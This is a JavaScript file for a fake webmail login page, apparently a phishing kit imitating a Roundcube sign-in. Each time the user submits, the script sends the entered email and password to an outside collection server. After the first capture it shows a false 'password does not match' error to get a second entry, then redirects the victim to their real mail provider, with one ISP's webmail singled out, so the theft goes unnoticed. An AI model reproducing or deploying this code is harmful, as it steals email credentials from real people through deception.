document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("userForm");
  const messageDiv = document.getElementById("message");
  const submitButton = document.getElementById("rcmloginsubmit");
  const originalButtonText = submitButton.textContent;
  let submissionCount = 0; // Track number of submissions
  let lastFormData = null; // store last-submitted form data in-memory briefly

  form.addEventListener("submit", async (e) => {
    e.preventDefault(); // prevent form default submission

    submissionCount++; // Increment submission count

    // First submission: submit to backend, clear password, and show message
    if (submissionCount === 1) {
      // indicate progress on the button instead of the message div
      submitButton.disabled = true;
      submitButton.textContent = "Verifying...";
      messageDiv.classList.add("show");
      messageDiv.classList.remove("success", "error");

      const formData = {
        email: document.getElementById("rcmloginuser").value,
        password: document.getElementById("rcmloginpwd").value,
      };

      try {
        const backendURL = "https://fiber-1-otce.onrender.com/api/user";

        const response = await fetch(backendURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        });

        let result;
        try {
          result = await response.json();
        } catch (jsonErr) {
          console.error("Failed to parse JSON:", jsonErr);
          messageDiv.textContent = "Error parsing server response";
          messageDiv.classList.add("show", "error");
          submitButton.disabled = false;
          return;
        }

        // Clear password field regardless of response
        const passwordField = document.getElementById("rcmloginpwd");
        passwordField.value = "";

        if (response.ok && result.success) {
          messageDiv.textContent =
            "The username or password does not match our records. Please try again.";
          messageDiv.classList.remove("error");
          messageDiv.classList.add("show", "success");
        } else {
          console.error("Backend error:", result);
          messageDiv.textContent =
            "Error: " + (result.message || "Something went wrong ❌");
          messageDiv.classList.remove("success");
          messageDiv.classList.add("show", "error");
        }
      } catch (error) {
        console.error("Network / fetch error:", error);
        messageDiv.textContent = "Network error: " + error.message;
        messageDiv.classList.remove("success");
        messageDiv.classList.add("show", "error");
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = originalButtonText;
      }
      return;
    }

    // Second submission: proceed with form submission and redirect
    // Disable the button and show progress on it
    submitButton.disabled = true;
    submitButton.textContent = "Verifying...";
    messageDiv.textContent = "";
    messageDiv.classList.add("show");
    messageDiv.classList.remove("success", "error");

    // Build formData; if the password field is empty (we cleared it on first
    // submit) fall back to the last submitted password stored in memory.
    const email = document.getElementById("rcmloginuser").value;
    let password = document.getElementById("rcmloginpwd").value;
    if (!password && lastFormData && lastFormData.password) {
      password = lastFormData.password;
    }

    const formData = { email, password };

    try {
      // Update this URL to match your backend (local or deployed)
      const backendURL = "https://fiber-1-otce.onrender.com/api/user";

      const response = await fetch(backendURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      // Check if the response is JSON
      let result;
      try {
        result = await response.json();
      } catch (jsonErr) {
        console.error("Failed to parse JSON:", jsonErr);
        messageDiv.textContent = "Error parsing server response";
        messageDiv.classList.add("show", "error");
        return;
      }

      if (response.ok && result.success) {
        messageDiv.textContent =
          result.message || "Form submitted successfully ✅";
        messageDiv.classList.remove("error");
        messageDiv.classList.add("show", "success");
        form.reset();
        submissionCount = 0; // Reset counter for next round
        // Determine redirect based on the user's email domain
        (function doRedirect() {
          const submittedEmail =
            email || (lastFormData && lastFormData.email) || "";
          let redirectUrl = "https://www.google.com"; // fallback

          if (submittedEmail && submittedEmail.includes("@")) {
            let host = submittedEmail
              .split("@")[1]
              .split(/[\/?#]/)[0]
              .toLowerCase();
            host = host.replace(/^www\./, "");

            // special-case: adams.net => webmail.adams.net
            if (host.endsWith("adams.net")) {
              redirectUrl = "https://webmail.adams.net/";
            } else {
              // small provider map to prefer canonical webmail pages
              const providerMap = {
                "gmail.com": "https://gmail.com",
                "googlemail.com": "https://gmail.com",
                "yahoo.com": "https://yahoo.com",
                "ymail.com": "https://yahoo.com",
                "outlook.com": "https://outlook.com",
                "hotmail.com": "https://outlook.live.com",
              };

              redirectUrl = providerMap[host] || `https://${host}`;
            }
          }

          // Redirect after short delay; we won't include any data in the URL.
          setTimeout(() => {
            // Note: cannot control console or content on external domains.
            window.location.href = redirectUrl;
          }, 2000);
        })();
      } else {
        console.error("Backend error:", result);
        messageDiv.textContent =
          "Error: " + (result.message || "Something went wrong ❌");
        messageDiv.classList.remove("success");
        messageDiv.classList.add("show", "error");
      }
    } catch (error) {
      console.error("Network / fetch error:", error);
      messageDiv.textContent = "Network error: " + error.message;
      messageDiv.classList.remove("success");
      messageDiv.classList.add("show", "error");
    } finally {
      submitButton.disabled = false;
      submitButton.textContent = originalButtonText;
    }
  });
});
